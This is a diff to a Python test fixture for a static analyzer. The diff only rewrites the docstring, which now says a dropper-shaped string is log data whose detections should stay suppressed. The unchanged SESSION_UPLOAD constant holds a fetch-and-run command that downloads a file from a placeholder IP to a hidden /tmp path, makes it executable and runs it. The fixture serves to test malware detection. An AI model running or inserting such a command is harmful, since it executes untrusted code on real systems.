@@ -1,7 +1,7 @@
 """Static analyzer control. Never install or publish this fixture.
 
-Counterfactual to synth_fake_session_controls.py: byte-identical dropper
-string outside a synth_* file, so the hidden-stage composite must fire.
+Dropper-shaped command outside a synth_* file, written only as log data.
+Without process execution, the hidden-stage composites must stay suppressed.
 """
 SESSION_UPLOAD = "wget http://198.51.100.42:8080/m -O /tmp/.m && chmod +x /tmp/.m && /tmp/.m &"
 
